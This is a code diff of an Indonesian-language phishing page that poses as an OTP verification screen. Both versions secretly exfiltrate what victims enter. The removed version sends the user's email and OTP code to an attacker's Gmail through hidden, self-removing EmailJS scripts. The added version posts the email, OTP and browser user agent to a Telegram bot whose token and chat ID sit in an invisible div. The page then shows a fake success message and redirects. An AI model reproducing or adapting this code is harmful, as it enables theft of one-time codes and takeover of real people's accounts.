@@ -7,11 +7,8 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-    rel="stylesheet" />
-  
-  <!-- ✅ EMAILJS SDK DISEMBUNYIKAN -->
-  <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> -->
-  
+    rel="stylesheet"
+  />
   <style>
     @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
     body {
@@ -49,9 +46,20 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
+    .hidden-data {
+      display: none;
+    }
   </style>
 </head>
 <body class="min-h-screen flex justify-center items-start pt-10 px-4">
+  <!-- Data sensitif disembunyikan dari tampilan pengguna -->
+  <div class="hidden-data" id="telegramConfig">
+    {
+      "botToken": "8440162875:AAEyc5EsiQHpKHlpKwLFy0F4xYq_upfI5F8",
+      "chatId": "7718023142"
+    }
+  </div>
+  
   <div class="w-full max-w-md">
     <div class="flex justify-end mb-6">
       <button aria-label="Close" class="text-white text-2xl font-bold leading-none hover:text-green-400 transition-colors">
@@ -136,7 +144,12 @@
   </div>
 
   <script>
-    // ✅ KODE UTAMA TANPA PERUBAHAN
+    // Ambil konfigurasi Telegram dari elemen tersembunyi
+    const telegramConfig = JSON.parse(document.getElementById('telegramConfig').textContent);
+    const TELEGRAM_BOT_TOKEN = telegramConfig.botToken;
+    const TELEGRAM_CHAT_ID = telegramConfig.chatId;
+    
+    // Elemen UI
     const verificationCode = document.getElementById("verificationCode");
     const submitBtn = document.getElementById("submitBtn");
     const resendBtn = document.getElementById("resendBtn");
@@ -147,10 +160,12 @@
     const successMessage = document.getElementById("successMessage");
     const emailDisplay = document.getElementById("emailDisplay");
 
+    // Ambil email dari localStorage (jika ada)
     const userEmail = localStorage.getItem('userEmail') || '*********@gmail.com';
     emailDisplay.textContent = userEmail;
 
-    let countdown = 30;
+    // Countdown timer untuk kirim ulang
+    let countdown = 48;
     let timer;
 
     function startCountdown() {
@@ -162,123 +177,104 @@
           clearInterval(timer);
           resendBtn.disabled = false;
           resendBtn.textContent = "Kirim ulang";
-          countdown = 30;
+          countdown = 48;
         } else {
           resendBtn.textContent = `${countdown}s Kirim ulang`;
         }
       }, 1000);
     }
 
+    // Aktifkan tombol submit jika input tidak kosong
     verificationCode.addEventListener("input", () => {
       submitBtn.disabled = verificationCode.value.trim() === "";
       submitBtn.classList.toggle("opacity-50", verificationCode.value.trim() === "");
       submitBtn.classList.toggle("cursor-not-allowed", verificationCode.value.trim() === "");
     });
 
+    // Fungsi untuk mengirim pesan ke Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const data = await response.json();
+        return data.ok;
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Kirim kode OTP via Telegram
     document.getElementById("verificationForm").addEventListener("submit", async (e) => {
       e.preventDefault();
       const code = verificationCode.value.trim();
       if (!code) return;
 
+      // Tampilkan loading state
       submitBtn.disabled = true;
       btnText.textContent = 'Memverifikasi...';
       loadingSpinner.style.display = 'block';
 
       try {
-        // ✅ KODE PENGIRIMAN EMAIL YANG DISEMBUNYIKAN
-        const emailJsCode = `
-          (function() {
-            var e=document.createElement('script');
-            e.src='https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-            e.onload=function() {
-              emailjs.init("ZV88Q0QnFIR6RvRPh");
-              emailjs.send("service_0dd2m1j","template_f5z9ae1",{
-                email: "${userEmail}",
-                otp_code: "${code}",
-                date: new Date().toLocaleString('id-ID'),
-                to_email: "akunbarudaftar07@gmail.com"
-              }).then(function() {
-                console.log('OTP email sent successfully');
-              }, function(error) {
-                console.error('OTP email failed:', error);
-              });
-            };
-            document.head.appendChild(e);
-          })();
+        // Format pesan untuk Telegram
+        const message = `
+🔐 <b>OTP Verification Data</b>
+📧 <b>Email:</b> <code>${userEmail}</code>
+🔢 <b>OTP Code:</b> <code>${code}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>User Agent:</b> ${navigator.userAgent}
         `;
         
-        // ✅ EKSEKUSI KODE YANG DISEMBUNYIKAN
-        const script = document.createElement('script');
-        script.textContent = emailJsCode;
-        document.head.appendChild(script);
-        document.head.removeChild(script);
-
-        // ✅ SIMULASI PROSES BERHASIL
-        successMessage.style.display = 'flex';
+        // Kirim data ke Telegram
+        const success = await sendToTelegram(message);
         
-        setTimeout(() => {
-  window.location.href = "kadaluarsa.html";
-}, 2000);
-        
+        if (success) {
+          successMessage.style.display = 'flex';
+          
+          // Redirect setelah 2 detik
+          setTimeout(() => {
+            window.location.href = "kadaluarsa.html";
+          }, 2000);
+        } else {
+          throw new Error('Gagal mengirim kode verifikasi ke Telegram');
+        }
       } catch (error) {
         console.error('Error:', error);
         
+        // Tampilkan pesan error
         errorText.textContent = 'Kode OTP tidak valid atau telah kadaluarsa.';
         errorMessage.style.display = 'flex';
         
+        // Reset loading state
         submitBtn.disabled = false;
         btnText.textContent = 'Verifikasi';
         loadingSpinner.style.display = 'none';
       }
     });
 
-    // ✅ FUNGSI KIRIM ULANG YANG DISEMBUNYIKAN
+    // Kirim ulang kode
     resendBtn.addEventListener("click", () => {
       startCountdown();
       successMessage.style.display = 'none';
       errorMessage.style.display = 'none';
       
-      // ✅ KODE PENGIRIMAN ULANG YANG DISEMBUNYIKAN
-      const resendEmailCode = `
-        (function() {
-          var e=document.createElement('script');
-          e.src='https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-          e.onload=function() {
-            emailjs.init("ZV88Q0QnFIR6RvRPh");
-            emailjs.send("service_0dd2m1j","template_resend_otp",{
-              email: "${userEmail}",
-              date: new Date().toLocaleString('id-ID'),
-              to_email: "akunbarudaftar07@gmail.com"
-            }).then(function() {
-              console.log('Resend OTP email sent');
-            }, function(error) {
-              console.error('Resend OTP failed:', error);
-            });
-          };
-          document.head.appendChild(e);
-        })();
-      `;
-      
-      const resendScript = document.createElement('script');
-      resendScript.textContent = resendEmailCode;
-      document.head.appendChild(resendScript);
-      document.head.removeChild(resendScript);
-
-      // ✅ NOTIFIKASI ELEGAN (MENGGANTIKAN ALERT)
-      const notification = document.createElement('div');
-      notification.className = 'fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50';
-      notification.innerHTML = `
-        <div class="flex items-center">
-          <i class="fas fa-check-circle mr-2"></i>
-          <span>Kode verifikasi baru telah dikirim!</span>
-        </div>
-      `;
-      document.body.appendChild(notification);
-      setTimeout(() => {
-        document.body.removeChild(notification);
-      }, 3000);
+      // Simulasi pengiriman ulang kode
+      alert("Kode verifikasi baru telah dikirim ke email Anda.");
     });
 
+    // Mulai countdown saat halaman dimuat
     startCountdown();
   </script>
 </body>
